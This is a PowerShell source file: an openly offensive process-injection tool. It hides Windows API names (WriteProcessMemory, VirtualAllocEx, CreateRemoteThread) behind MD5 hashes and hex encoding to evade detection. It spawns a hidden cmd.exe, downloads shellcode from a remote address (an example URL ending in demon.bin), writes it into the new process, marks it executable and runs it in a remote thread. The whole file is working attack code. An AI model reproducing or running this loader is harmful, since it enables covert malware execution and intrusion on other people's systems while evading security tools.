<#
    Simple Spawn and Inject powershell script that is making use of reflection, custom delegates and added obfuscation for potentially flagged strings. Obfuscation is trough simple MD5 hashes and Hex encoding for api names, methods and types
#>
$names_dict = @{
    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"
    "libs" = @{
        "k32" = "6b,65,72,6e,65,6c,33,32,2e,64,6c,6c"
        "nt" = "6e,74,64,6c,6c,2e,64,6c,6c"
    }
    "types" = @{
        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"
        "native" = "9c1998077be57de794acb2cc817ea2c6"
        "start_inf" = "7954136bca5e20bcb3924bae9cd769c2"
        "proc_inf" = "b8204d05f2f6302a23f8d870b2470d25"
    }
    "apis" = @{
        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"
        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"
        "cproc" = "c6b59bdabc4d10b6cd98e97dbd071549"
        "wpm" = "57,72,69,74,65,50,72,6f,63,65,73,73,4d,65,6d,6f,72,79" # WriteProcessMemory
        "vae" = "56,69,72,74,75,61,6c,41,6c,6c,6f,63,45,78" # VirtualAllocEx
        "vpe" = "56,69,72,74,75,61,6c,50,72,6f,74,65,63,74,45,78" # VirtualProtectEx
        "crt" = "43,72,65,61,74,65,52,65,6d,6f,74,65,54,68,72,65,61,64" # CreateRemoteThread
    }
}


$global:GMH = $null
$global:GPA = $null
$global:LLB = $null


function GetMd5 {
    Param([string]$name)
    return (([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($name)) | ForEach-Object { "{0:x2}" -f $_ }) -join ""
}


function GetType {
    Param([string]$type_name)

    [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache } | ForEach {
        $n = GetMd5 $_.Location.Split('\\')[-1]
        if ($n -eq $names_dict["sys_name"]) {
            $_.GetTypes() | ForEach {
                $n = GetMd5 $_.FullName
                if ($n -eq $type_name) {
                    return $_
                }
            }
        }
    }
}


function PrepareBase {
    $GPAs = @()
    [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache } | ForEach { 
        $n = GetMd5 $_.Location.Split('\\')[-1]
        if ($n -eq $names_dict["sys_name"]) {
            $_.GetTypes() | ForEach {
                $n = GetMd5 $_.FullName
                if ($n -eq $names_dict["types"]["unsafe"]) {
                    $_.GetMethods() | ForEach {
                        $h = GetMd5 $_.Name
                        if ($h -eq $names_dict["apis"]["get_hand"]) {
                            $global:GMH = $_
                        } elseif ($h -eq $names_dict["apis"]["get_addr"]) {
                            $GPAs += $_
                        }
                    }
                }
            }
        } 
    }
    $global:GPA = $GPAs[0];
}


function ResolveAddr {
    Param([string]$lib_name, [string]$func_name)

    $libh = $global:GMH.Invoke($null, @($lib_name))
    try {
        $faddr = $global:GPA.Invoke($null, @($libh, $func_name))
        return $faddr
    } catch {
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $libh)
        $faddr = $global:GPA.Invoke($null, @($handleRef, $func_name))
        return $faddr
    }
}


function PrepareAPI {
    Param(
      [IntPtr]$faddr,
      [Type]$ret_type,
      [Type[]]$arg_types
    )

    $asm = New-Object System.Reflection.AssemblyName('MyRefl')
    $domain = [AppDomain]::CurrentDomain
    $asm_build = $domain.DefineDynamicAssembly($asm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod_build = $asm_build.DefineDynamicModule('MyMod', $false)
    $type_build = $mod_build.DefineType('MyDeleg', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $const_build = $type_build.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arg_types)
    $const_build.SetImplementationFlags('Runtime, Managed')
    $method_build = $type_build.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ret_type, $arg_types)
    $method_build.SetImplementationFlags('Runtime, Managed')
    $dlg_type = $type_build.CreateType()
    $myFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($faddr, $dlg_type)
    return $myFunc
}



function Spawn {
    Param([string]$proc_to_spawn)

    $cproc = $null
    (GetType $names_dict["types"]["native"]).GetMethods() | ForEach {
        $n = GetMd5 $_.Name
        if ($n -eq $names_dict["apis"]["cproc"]) {
            $cproc = $_
        }
    }
    $startupInfoType = GetType $names_dict["types"]["start_inf"]
    $procInfoType = GetType $names_dict["types"]["proc_inf"]

    $startInfo = $startupInfoType.GetConstructors().Invoke($null)
    $procInfo = $procInfoType.GetConstructors().Invoke($null)
    $pName = [System.Text.StringBuilder]::new($proc_to_spawn)

    $startInfo.dwFlags = 0x00000001
    $startInfo.wShowWindow = 0x00000000 


    $cproc.Invoke($null, @($null, $pName, $null, $null, $false, 0x08000000, [IntPtr]::Zero, $null, $startInfo, $procInfo)) | Out-Null
    Write-Host "[+] Process created with ID: $($procInfo.dwProcessId)"
    return $procInfo
}



function WriteAndSpawn {
    Param(
        [System.Object]$procInfo,
        [string]$sc_location
    )

    $wpm = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["wpm"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([bool]) `
                @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])
    $vae = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["vae"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([IntPtr]) `
                @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])
    $vpe = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["vpe"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([bool]) `
                @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
    $crt = PrepareApi `
            (ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["crt"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) `
                ([IntPtr]) `
                @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
                            

    $wc = New-Object System.Net.WebClient
    [Byte[]] $sc = $wc.DownloadData($sc_location)

    Write-Host "[+] Allocating memory with size: $($sc.Length)"
    [IntPtr]$mem_addr = $vae.Invoke($procInfo.hProcess, [IntPtr]::Zero, $sc.Length, 0x3000, 0x04);

    Write-Host "[+] Writing shellcode to address: 0x$($mem_addr.ToString('X'))"
    $wpm.Invoke($procInfo.hProcess, $mem_addr, $sc, $sc.Length, [IntPtr]::Zero) | Out-Null
    
    Write-Host "[+] Changing memory protection"
    $old = 0
    $vpe.Invoke($procInfo.hProcess, $mem_addr, $sc.Length, 0x20, [ref]$old) | Out-Null

    Write-Host "[+] Creating an execution thread"
    $crt.Invoke($procInfo.hProcess, [IntPtr]::Zero, 0, $mem_addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
}


function Invoke-Injection {
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Shellcode  ## http://192.168.1.21/demon.bin
        [string]$Process    ## C:\\Windows\\System32\\cmd.exe
    )
    
    PrepareBase
    $to_spawn = $Process
    $procInfo = Spawn $to_spawn
    WriteAndSpawn $procInfo $Shellcode
}
